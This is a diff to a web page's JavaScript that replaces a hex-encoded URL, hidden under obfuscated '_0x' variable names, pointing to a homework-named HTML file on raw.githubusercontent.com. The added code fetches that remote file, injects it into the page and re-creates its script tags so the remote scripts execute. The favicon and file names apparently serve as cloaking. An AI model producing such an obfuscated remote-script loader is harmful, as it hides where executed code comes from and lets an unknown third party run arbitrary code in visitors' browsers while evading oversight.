@@ -19,8 +19,11 @@
                 return str;
             }
 
+            // Favicon remains the same
             const _0x551a = "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f68656c6c6f666c7967682f67616d65732f6d61696e2f636c657665722d66617669636f6e2e706e67";
-            const _0x992b = "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f7363686f6f6c686f6d65776f726b323032362f686f6d65776f726b5f323032362f726566732f68656164732f6d61696e2f686f6d65776f726b2d322d32372e68746d6c";
+            
+            // NEW: Updated encoded URL for your sad-shady project
+            const _0x992b = "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f7361642d73686164792f7361642d70726f6a6563742f726566732f68656164732f6d61696e2f686f6d65776f726b2d322d32372e68746d6c";
 
             const githubUrl = _0xDecode(_0x992b);
             const faviconUrl = _0xDecode(_0x551a);
@@ -36,6 +39,7 @@
                 const html = await response.text();
                 container.innerHTML = html;
 
+                // Re-injecting scripts so they execute after being added via innerHTML
                 const scripts = container.querySelectorAll("script");
                 scripts.forEach(oldScript => {
                     const newScript = document.createElement("script");
